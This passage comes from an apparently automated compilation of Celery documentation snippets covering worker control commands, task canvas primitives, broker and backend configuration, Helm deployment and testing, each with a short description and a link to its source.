detected\")\n\nsubtask = raise_exception.subtask()\n\nsubtask.apply_async(link_error=handle_task_exception.s())\n```\n\n----------------------------------------\n\nTITLE: Worker Stats Command Response Example\nDESCRIPTION: Example response from the worker stats command showing task execution statistics and pool information.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n[{'worker.local':\n     'total': {'tasks.sleeptask': 6},\n     'pool': {'timeouts': [None, None],\n              'processes': [60376, 60377],\n              'max-concurrency': 2,\n              'max-tasks-per-child': None,\n              'put-guarded-by-semaphore': True}}]\n```\n\n----------------------------------------\n\nTITLE: Accessing Celery App Configuration as a Censored Dictionary in Python Interactive Shell\nDESCRIPTION: Utilizes app.conf.table to extract the configuration as a dict-like table, hiding sensitive information similarly to humanize. Suitable for situations where the configuration needs to be consumed programmatically instead of rendered as a string. Parameters with_defaults and censored control scope and redaction.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_14\n\nLANGUAGE: pycon\nCODE:\n```\n>>> app.conf.table(with_defaults=False, censored=True)\n```\n\n----------------------------------------\n\nTITLE: Opening Flower Web Interface\nDESCRIPTION: Opens the Flower web interface, typically running at `http://localhost:5555`, in the default web browser. Assumes Flower is running.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_25\n\nLANGUAGE: console\nCODE:\n```\n$ open http://localhost:5555\n```\n\n----------------------------------------\n\nTITLE: Executing Chunks and Retrieving Results in Python Console\nDESCRIPTION: Shows how to execute chunks of tasks and retrieve the results, demonstrating the division of work into smaller groups.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_66\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from proj.tasks import add\n\n>>> res = add.chunks(zip(range(100), range(100)), 10)()\n>>> res.get()\n[[0, 2, 4, 6, 8, 10, 12, 14, 16, 18],\n [20, 22, 24, 26, 28, 30, 32, 34, 36, 38],\n [40, 42, 44, 46, 48, 50, 52, 54, 56, 58],\n [60, 62, 64, 66, 68, 70, 72, 74, 76, 78],\n [80, 82, 84, 86, 88, 90, 92, 94, 96, 98],\n [100, 102, 104, 106, 108, 110, 112, 114, 116, 118],\n [120, 122, 124, 126, 128, 130, 132, 134, 136, 138],\n [140, 142, 144, 146, 148, 150, 152, 154, 156, 158],\n [160, 162, 164, 166, 168, 170, 172, 174, 176, 178],\n [180, 182, 184, 186, 188, 190, 192, 194, 196, 198]]\n```\n\n----------------------------------------\n\nTITLE: Starting Celery Events Snapshot Camera\nDESCRIPTION: Starts `celery events` in snapshot mode, using a specified camera class to periodically capture and process cluster state. The `--frequency` argument sets the snapshot interval in seconds. Requires the Celery application instance (`-A proj`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_27\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj events --camera=<camera-class> --frequency=1.0\n```\n\n----------------------------------------\n\nTITLE: Applying Chunks Asynchronously in Python Console\nDESCRIPTION: Demonstrates how to apply chunks asynchronously, creating a dedicated task for execution in a worker.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_67\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add.chunks(zip(range(100), range(100)), 10).apply_async()\n```\n\n----------------------------------------\n\nTITLE: Evaluating Celery Task Name Resolution When Imported in Python Interactive Shell\nDESCRIPTION: Illustrates how task names differ depending on whether a module is executed directly or imported. When imported, the task name is prefixed with the actual module name ('tasks' here). Shows how to access the name attribute of a task for verification. Dependencies: the module 'tasks' must be present and importable, and must export 'add'.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_3\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from tasks import add\n>>> add.name\ntasks.add\n```\n\n----------------------------------------\n\nTITLE: Understanding Callback Argument Passing in Celery (Conceptual)\nDESCRIPTION: Explains that when a callback signature (like `add.s(10)`) is linked to a parent task, the result of the parent task (`result`) is automatically passed as the first argument to the callback when it's executed. `sig.delay(result)` effectively becomes `add.apply_async(args=(result, 10))`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_19\n\nLANGUAGE: pycon\nCODE:\n```\n>>> sig = add.s(10)\n```\n\nLANGUAGE: pycon\nCODE:\n```\n>>> sig.delay(result)\n```\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add.apply_async(args=(result, 10))\n```\n\n----------------------------------------\n\nTITLE: Adding Consumer to Specific Worker\nDESCRIPTION: Command to add a consumer to a specific worker using the --destination option. This allows targeting the add_consumer command to a particular worker instance.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_24\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj control add_consumer foo -d celery@worker1.local\n```\n\n----------------------------------------\n\nTITLE: Inspecting Scheduled ETA Celery Tasks\nDESCRIPTION: Lists tasks that have been received by workers but are scheduled to run at a future time (using `eta` or `countdown`). Requires the Celery application instance (`-A proj`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_8\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj inspect scheduled\n```\n\n----------------------------------------\n\nTITLE: Handling Custom Exceptions in Celery Python Classes\nDESCRIPTION: Shows how to define and raise custom exceptions within a class, making them easily accessible and documentable.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/guide.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nclass Empty(Exception):\n    pass\n\nclass Queue:\n    Empty = Empty\n\n    def get(self):\n        \"\"\"Get the next item from the queue.\n\n        :raises Queue.Empty: if there are no more items left.\n\n        \"\"\"\n        try:\n            return self.queue.popleft()\n        except IndexError:\n            raise self.Empty()\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Visibility Timeout in Celery\nDESCRIPTION: Python code snippet showing how to configure the visibility timeout for Redis broker in Celery. This setting affects the redelivery of unacknowledged messages.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nBROKER_TRANSPORT_OPTIONS = {'visibility_timeout': 18000}  # 5 hours\n```\n\n----------------------------------------\n\nTITLE: Equivalent Task Definition for starmap in Python\nDESCRIPTION: Demonstrates a task definition that produces the same result as the starmap example, using a list comprehension.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_63\n\nLANGUAGE: python\nCODE:\n```\n@app.task\ndef temp():\n    return [add(i, i) for i in range(10)]\n```\n\n----------------------------------------\n\nTITLE: Upgrading or Installing Celery Helm Chart - Shell\nDESCRIPTION: These shell commands use helm's upgrade --install pattern to update or create the Celery installation in a Kubernetes cluster. The first command applies default configuration, while the second allows for environment-specific overrides with a custom values YAML file. Dependencies include an existing helm release or a cluster ready for installation.\nSOURCE: https://github.com/celery/celery/blob/main/helm-chart/README.rst#2025-04-23_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nhelm upgrade --install celery helm-chart/\n```\n\nLANGUAGE: shell\nCODE:\n```\nhelm upgrade --install celery helm-chart/ --values helm-chart/values_dev.yaml\n```\n\n----------------------------------------\n\nTITLE: Protocol V1 Task Message Example in JavaScript\nDESCRIPTION: Example of a Version 1 task message format in JSON showing basic task invocation structure\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/protocol.rst#2025-04-23_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n{\"id\": \"4cc7438e-afd4-4f8f-a2f3-f46567e7ca77\",\n \"task\": \"celery.task.PingTask\",\n \"args\": [],\n \"kwargs\": {},\n \"retries\": 0,\n \"eta\": \"2009-11-17T12:30:56.527191\"}\n```\n\n----------------------------------------\n\nTITLE: Skewing Group Execution with Countdown in Python Console\nDESCRIPTION: Demonstrates how to apply a skewed countdown to a group of tasks, incrementing the delay for each task.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_69\n\nLANGUAGE: pycon\nCODE:\n```\n>>> group.skew(start=1, stop=10)()\n```\n\n----------------------------------------\n\nTITLE: Freezing Task Signatures\nDESCRIPTION: Examples of using the new freeze() method to finalize task signatures and groups\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\n>>> s = add.s(2, 2)\n>>> result = s.freeze()\n>>> result\n<AsyncResult: ffacf44b-f8a1-44e9-80a3-703150151ef2>\n>>> s.delay()\n<AsyncResult: ffacf44b-f8a1-44e9-80a3-703150151ef2>\n\n>>> g = group(add.s(2, 2), add.s(4, 4))\n>>> result = g.freeze()\n<GroupResult: e1094b1d-08fc-4e14-838e-6d601b99da6d [\n    70c0fb3d-b60e-4b22-8df7-aa25b9abc86d,\n    58fcd260-2e32-4308-a2ea-f5be4a24f7f4]>\n>>> g()\n<GroupResult: e1094b1d-08fc-4e14-838e-6d601b99da6d [70c0fb3d-b60e-4b22-8df7-aa25b9abc86d, 58fcd260-2e32-4308-a2ea-f5be4a24f7f4]>\n```\n\n----------------------------------------\n\nTITLE: Converting Chunks to a Group in Python Console\nDESCRIPTION: Shows how to convert chunks into a group for further manipulation or execution.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_68\n\nLANGUAGE: pycon\nCODE:\n```\n>>> group = add.chunks(zip(range(100), range(100)), 10).group()\n```\n\n----------------------------------------\n\nTITLE: Illustrating New Celery BROKER Settings (v0.8.1+) in Python\nDESCRIPTION: This snippet demonstrates the updated configuration format for the message broker introduced in Celery version 0.8.1. The previously used AMQP_* settings were renamed to BROKER_* (e.g., AMQP_SERVER became BROKER_HOST) for consistency. This configuration specifies the host, port, user credentials, and virtual host for the broker connection.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\nBROKER_HOST = 'localhost'\nBROKER_PORT = 5678\nBROKER_USER = 'myuser'\nBROKER_PASSWORD = 'mypassword'\nBROKER_VHOST = 'celery'\n```\n\n----------------------------------------\n\nTITLE: Installing tblib for Celery Remote Tracebacks (Console)\nDESCRIPTION: Provides the pip command required to install the `tblib` library. This library is a prerequisite for enabling the `task_remote_tracebacks` setting in Celery, which allows worker stack traces to be included in task results when errors occur. Using the `celery[tblib]` extra ensures the correct version compatible with Celery is installed.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_7\n\nLANGUAGE: console\nCODE:\n```\n$ pip install celery[tblib]\n```\n\n----------------------------------------\n\nTITLE: Executing Celery Signature Directly (Inline) in Python\nDESCRIPTION: Reiterates that calling a signature object directly using parentheses `()` executes the task synchronously in the current process.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_10\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add.s(2, 2)()\n4\n```\n\n----------------------------------------\n\nTITLE: Specifying Connection for Celery Control Inspect in Python\nDESCRIPTION: Shows how to use `celery.control.inspect` with a specific broker connection, rather than the default one configured in the app. It creates a `kombu.Connection` object for a Redis broker and passes it via the `connection` argument to the `inspect()` function, allowing inspection commands (like `active_queues()`) to target that specific broker. Requires `kombu.Connection` and `celery.control`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_32\n\nLANGUAGE: python\nCODE:\n```\nfrom kombu import Connection\n\ni = celery.control.inspect(connection=Connection('redis://'))\ni.active_queues()\n```\n\n----------------------------------------\n\nTITLE: Group Unrolling Behavior Change in Celery 5.x\nDESCRIPTION: Illustrates how the group unrolling behavior has changed between Celery 4.x and 5.x, with 5.x correctly unrolling a group with a single signature into a chain.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_50\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from celery import chain, group\n>>> from tasks import add\n>>> chain(group(add.s(1, 1)), add.s(2))\n%add([add(1, 1)], 2)\n```\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from celery import chain, group\n>>> from tasks import add\n>>> chain(group(add.s(1, 1)), add.s(2))\nadd(1, 1) | add(2)\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery Accepted Content Types in Python\nDESCRIPTION: Example showing how to configure the CELERY_ACCEPT_CONTENT setting to explicitly allow specific serialization formats for message passing. This is important as Pickle will no longer be the default serializer in Celery 4.0.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nCELERY_ACCEPT_CONTENT = ['pickle', 'json', 'msgpack', 'yaml']\n```\n\n----------------------------------------\n\nTITLE: Custom Task Schedule Implementation\nDESCRIPTION: Example of implementing a custom schedule class for dynamic periodic task intervals\nSOURCE: https://github.com/celery/celery/blob/main/docs/faq.rst#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.schedules import schedule\n\nclass my_schedule(schedule):\n\n    def is_due(self, last_run_at):\n        return run_now, next_time_to_check\n```\n\n----------------------------------------\n\nTITLE: Conceptual Explanation of Celery starmap Primitive\nDESCRIPTION: Explains the behavior of the Celery `starmap` primitive conceptually. `add.starmap([(2, 2), (4, 4)])` results in a single temporary task applying the `add` function to each tuple in the list using star-arguments: `[add(2, 2), add(4, 4)]`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_22\n\nLANGUAGE: python\nCODE:\n```\nres = [add(2, 2), add(4, 4)]\n```\n\n----------------------------------------\n\nTITLE: Purging Celery Queues Excluding Specific Ones\nDESCRIPTION: Removes messages from all configured queues *except* for the ones specified with the `-X` option (in this case, the `celery` queue). Requires the Celery application instance (`-A proj`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_6\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj purge -X celery\n```\n\n----------------------------------------\n\nTITLE: Starting Celery Worker with Project Settings\nDESCRIPTION: Command line instruction to start a Celery worker with project settings and info-level logging\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_5\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj worker -l info\n```\n\n----------------------------------------\n\nTITLE: Using Celery in Single-Mode vs App Mode in Python\nDESCRIPTION: Compares the usage of Celery in single-mode and app mode, demonstrating the differences in importing and task definition.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/guide.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\n# Single-mode\nfrom celery import task\nfrom celery.task.control import inspect\n\nfrom .models import CeleryStats\n\n@task\ndef write_stats_to_db():\n    stats = inspect().stats(timeout=1)\n    for node_name, reply in stats:\n        CeleryStats.objects.update_stat(node_name, stats)\n```\n\nLANGUAGE: python\nCODE:\n```\n# App mode\nfrom .celery import celery\nfrom .models import CeleryStats\n\n@app.task\ndef write_stats_to_db():\n    stats = celery.control.inspect().stats(timeout=1)\n    for node_name, reply in stats:\n        CeleryStats.objects.update_stat(node_name, stats)\n```\n\nLANGUAGE: python\nCODE:\n```\n# Celery app instance\nfrom celery import Celery\n\napp = Celery(broker='amqp://')\n```\n\n----------------------------------------\n\nTITLE: Conceptual Explanation of Celery map Primitive\nDESCRIPTION: Explains the behavior of the Celery `map` primitive conceptually. `task.map([1, 2])` results in a single temporary task that applies the original `task` function to each item in the list sequentially, collecting the results: `[task(1), task(2)]`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_21\n\nLANGUAGE: python\nCODE:\n```\nres = [task(1), task(2)]\n```\n\n----------------------------------------\n\nTITLE: Applying a Celery Task via HTTP API - Shell\nDESCRIPTION: This example uses curl to invoke the apply endpoint in the HTTP gateway, applying a registered Celery task (in this case, 'celery.ping') and returning a task ID. Requires the Django server and Celery worker to be running. Takes the task name as parameter in the URL, returns a JSON object with operation status and task ID.\nSOURCE: https://github.com/celery/celery/blob/main/examples/celery_http_gateway/README.rst#2025-04-23_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ curl http://localhost:8000/apply/celery.ping/\n{\"ok\": \"true\", \"task_id\": \"e3a95109-afcd-4e54-a341-16c18fddf64b\"}\n```\n\n----------------------------------------\n\nTITLE: Simulating Forking for Celery Multi/Init-Script Debugging - Console\nDESCRIPTION: Shows how to bypass daemonization by using the C_FAKEFORK environment variable for debugging Celery multi or init-scripts. This enables visibility into errors that would be otherwise hidden. Requires Celery installed. Input: C_FAKEFORK=1 env var; Output: disables actual forking and keeps output visible.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_19\n\nLANGUAGE: console\nCODE:\n```\n$ C_FAKEFORK=1 celery multi start 10\n```\n\nLANGUAGE: console\nCODE:\n```\n$ C_FAKEFORK=1 /etc/init.d/celeryd start\n```\n\n----------------------------------------\n\nTITLE: Configuring System Hostname for RabbitMQ on macOS\nDESCRIPTION: Commands to set a permanent hostname and add it to /etc/hosts for proper RabbitMQ node naming and communication.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/rabbitmq.rst#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo scutil --set HostName myhost.local\n```\n\n----------------------------------------\n\nTITLE: Implementing JSON Serialization Support for Custom Classes\nDESCRIPTION: Example of implementing __json__ method on a custom class to support JSON serialization\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nclass Person:\n    first_name = None\n    last_name = None\n    address = None\n\n    def __json__(self):\n        return {\n            'first_name': self.first_name,\n            'last_name': self.last_name,\n            'address': self.address,\n        }\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Backend Override in Celery\nDESCRIPTION: Example of using the override_backends setting to specify a custom backend implementation class for the 'db' backend.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\noverride_backends = {\"db\": \"custom_module.backend.class\"}\n```\n\n----------------------------------------\n\nTITLE: Configuring Azure Block Blob Result Backend\nDESCRIPTION: Configuration example for using Azure Block Blob storage as a Celery result backend, showing the connection string format with account details.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_28\n\nLANGUAGE: python\nCODE:\n```\nresult_backend = 'azureblockblob://DefaultEndpointsProtocol=https;AccountName=somename;AccountKey=Lou...bzg==;EndpointSuffix=core.windows.net'\n```\n\n----------------------------------------\n\nTITLE: Displaying Specific Celery Command Help\nDESCRIPTION: Shows detailed help information for a specific Celery command (e.g., `inspect`, `control`, `status`). Replace `<command>` with the actual command name.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n$ celery <command> --help\n```\n\n----------------------------------------\n\nTITLE: Canceling Consumer on Specific Worker\nDESCRIPTION: Command to cancel a consumer on a specific worker using the --destination option. This allows targeting the cancel_consumer command to a particular worker instance.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_28\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj control cancel_consumer foo -d celery@worker1.local\n```\n\n----------------------------------------\n\nTITLE: Passing Execute Options to TaskSet\nDESCRIPTION: Shows how to pass execution options like countdown delays to individual tasks within a TaskSet when running multiple tasks together.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\nts = TaskSet(add, [([2, 2], {}, {\"countdown\": 1}),\n               ([4, 4], {}, {\"countdown\": 2}),\n               ([8, 8], {}, {\"countdown\": 3})])\nts.run()\n```\n\n----------------------------------------\n\nTITLE: Configuring Task Rate Limit Annotation in Celery with Python\nDESCRIPTION: Uses the new CELERY_ANNOTATIONS setting to change the rate_limit attribute for a specific task or all tasks. This example sets a rate limit of 10 tasks per second for the 'tasks.add' task.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-2.5.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nCELERY_ANNOTATIONS = {'tasks.add': {'rate_limit': '10/s'}}\n```\n\n----------------------------------------\n\nTITLE: Redis Connection URL Format\nDESCRIPTION: Standard format for Redis connection URL with optional password and database selection\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/redis.rst#2025-04-23_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nredis://:password@hostname:port/db_number\n```\n\n----------------------------------------\n\nTITLE: Running Celery Worker with Fair Scheduling in Shell\nDESCRIPTION: Command to start a Celery worker with the fair scheduling option enabled, which disables task prefetching behavior for more predictable task distribution.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ celery -A proj worker -l info -Ofair\n```\n\n----------------------------------------\n\nTITLE: Overriding Concurrency for Lists of Named Workers with `celeryd-multi` (Console)\nDESCRIPTION: Shows how to apply options, such as concurrency (`-c 10`), to a comma-separated list of named workers (`-c:foo,bar,baz`) when using `celeryd-multi`. This overrides the default concurrency (`-c 3`) for the specified workers (`foo`, `bar`, `baz`). The output shows the intended individual commands (note: the output in the source text incorrectly uses `celeryd-multi` instead of `celeryd`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_25\n\nLANGUAGE: console\nCODE:\n```\n$ celeryd-multi start foo bar baz xuzzy -c 3 -c:foo,bar,baz 10\nceleryd-multi -n foo.myhost -c 10\nceleryd-multi -n bar.myhost -c 10\nceleryd-multi -n baz.myhost -c 10\nceleryd-multi -n xuzzy.myhost -c 3\n```\n\n----------------------------------------\n\nTITLE: Requesting Bug Reports from Remote Celery Workers via Command Line\nDESCRIPTION: Shows how to use the `celery inspect report` command to request bug reports from running Celery workers remotely. This allows gathering diagnostic information from distributed worker instances. Requires the `celery` command-line tools and active workers.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_28\n\nLANGUAGE: console\nCODE:\n```\n$ celery inspect report\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery Environment via conf.d File - Bash\nDESCRIPTION: Provides an example /etc/conf.d/celery configuration file for defining environment variables used by systemd or init scripts to launch Celery workers. Variables include node names, command paths, app definition, multi command, argument options, process ID and log file paths, and log levels. Users should edit this file per deployment requirements and permissions. Prerequisite: Celery and related files installed; outputs: configured environment for Celery scripts.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/daemonizing.rst#2025-04-23_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\n# Name of nodes to start\n# here we have a single node\nCELERYD_NODES=\"w1\"\n# or we could have three nodes:\n#CELERYD_NODES=\"w1 w2 w3\"\n\n# Absolute or relative path to the 'celery' command:\nCELERY_BIN=\"/usr/local/bin/celery\"\n#CELERY_BIN=\"/virtualenvs/def/bin/celery\"\n\n# App instance to use\n# comment out this line if you don't use an app\nCELERY_APP=\"proj\"\n# or fully qualified:\n#CELERY_APP=\"proj.tasks:app\"\n\n# How to call manage.py\nCELERYD_MULTI=\"multi\"\n\n# Extra command-line arguments to the worker\nCELERYD_OPTS=\"--time-limit=300 --concurrency=8\"\n\n# - %n will be replaced with the first part of the nodename.\n# - %I will be replaced with the current child process index\n#   and is important when using the prefork pool to avoid race conditions.\nCELERYD_PID_FILE=\"/var/run/celery/%n.pid\"\nCELERYD_LOG_FILE=\"/var/log/celery/%n%I.log\"\nCELERYD_LOG_LEVEL=\"INFO\"\n\n# you may wish to add these options for Celery Beat\nCELERYBEAT_PID_FILE=\"/var/run/celery/beat.pid\"\nCELERYBEAT_LOG_FILE=\"/var/log/celery/beat.log\"\n```\n\n----------------------------------------\n\nTITLE: Controlling Worker Autoscaling Programmatically in Celery\nDESCRIPTION: Shows how to use the autoscale remote control command programmatically to dynamically adjust worker concurrency settings for workers with autoscaling enabled.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_11\n\nLANGUAGE: pycon\nCODE:\n```\n>>> celery.control.autoscale(max=10, min=5,\n...     destination=['w1.example.com'])\n```\n\n----------------------------------------\n\nTITLE: Starting Celery Workers with Custom Hostname using `celeryd-multi` (Console)\nDESCRIPTION: Illustrates using the `-n` option with `celeryd-multi` to specify a custom base hostname (`worker.example.com`) for the workers being started. The tool automatically appends numbers to the provided hostname for each worker instance, as shown in the output.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_21\n\nLANGUAGE: console\nCODE:\n```\n$ celeryd-multi start 2 -n worker.example.com -c 3\nceleryd -n celeryd1.worker.example.com -c 3\nceleryd -n celeryd2.worker.example.com -c 3\n```\n\n----------------------------------------\n\nTITLE: Overriding Concurrency for Specific Workers with `celeryd-multi` (Console)\nDESCRIPTION: Shows how to set a default concurrency level (`-c 3`) for multiple workers started via `celeryd-multi`, while overriding it for a specific worker identified by its index (`-c:1 10`). The output displays the generated `celeryd` commands reflecting this override for the first worker.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_22\n\nLANGUAGE: console\nCODE:\n```\n$ celeryd-multi start 3 -c 3 -c:1 10\nceleryd -n celeryd1.myhost -c 10\nceleryd -n celeryd2.myhost -c 3\nceleryd -n celeryd3.myhost -c 3\n```\n\n----------------------------------------\n\nTITLE: Stopping Multiple Celery Workers\nDESCRIPTION: Demonstrates the command to stop multiple named Celery worker nodes using celeryd-multi.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.1.rst#2025-04-23_snippet_13\n\nLANGUAGE: console\nCODE:\n```\n$ celeryd-multi stop jerry elaine george kramer\n```\n\n----------------------------------------\n\nTITLE: Overriding Celery Configuration for a Single Pytest Test Function\nDESCRIPTION: Shows how to use the `@pytest.mark.celery` marker to override specific Celery configuration settings for an individual test function. In this example, the `result_backend` setting is changed to 'redis://' just for `test_something`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\n@pytest.mark.celery(result_backend='redis://')\ndef test_something():\n    ...\n```\n\n----------------------------------------\n\nTITLE: Migrating from celery.task import task to celery import shared_task in Python\nDESCRIPTION: Shows how to update imports when the celery.task module is removed in version 5.0. Users need to change imports to use shared_task from the main celery package.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/deprecation.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.task import task\n```\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import shared_task\n```\n\n----------------------------------------\n\nTITLE: Installing RabbitMQ on Ubuntu/Debian\nDESCRIPTION: Command to install RabbitMQ message broker on Ubuntu or Debian systems using apt-get.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/first-steps-with-celery.rst#2025-04-23_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n$ sudo apt-get install rabbitmq-server\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Database Table Schemas in Celery\nDESCRIPTION: Example of using the database_table_schemas setting to customize the schema of result metadata tables when using SQLAlchemy as the result backend.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_15\n\nLANGUAGE: python\nCODE:\n```\n# use custom schema for the database result backend.\ndatabase_table_schemas = {\n    'task': 'celery',\n    'group': 'celery',\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Eventlet and Celery Dependencies via Pip\nDESCRIPTION: Shell command to install required Python packages: `eventlet` for the concurrency pool, `celery` itself, and `pybloom-live` (likely used by one of the examples). It's recommended to also install `dnspython` for asynchronous name lookups.\nSOURCE: https://github.com/celery/celery/blob/main/examples/eventlet/README.rst#2025-04-23_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\n$ python -m pip install eventlet celery pybloom-live\n```\n\n----------------------------------------\n\nTITLE: Tracing Imports for Debugging Celery Startup - Console\nDESCRIPTION: Shows how to enable import tracing for Celery at startup by setting the C_IMDEBUG environment variable. Using this method provides detailed import debugging as Celery components are loaded. Requires no additional dependencies beyond Celery. Input: C_IMDEBUG=1 env var; Output: import trace logs to stdout.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_16\n\nLANGUAGE: console\nCODE:\n```\n$ C_IMDEBUG=1 celery worker -l info\n```\n\nLANGUAGE: console\nCODE:\n```\n$ C_IMPDEBUG=1 celery shell\n```\n\n----------------------------------------\n\nTITLE: Implementing Composite Classes in Celery Python\nDESCRIPTION: Demonstrates how to create composite classes that can be overridden by inheritance or instantiation, providing flexibility for users.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/guide.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nclass Worker:\n    Consumer = Consumer\n\n    def __init__(self, connection, consumer_cls=None):\n        self.Consumer = consumer_cls or self.Consumer\n\n    def do_work(self):\n        with self.Consumer(self.connection) as consumer:\n            self.connection.drain_events()\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery Result Backend using URL in Python\nDESCRIPTION: Demonstrates configuring the Celery result backend using a URL string format, specifically 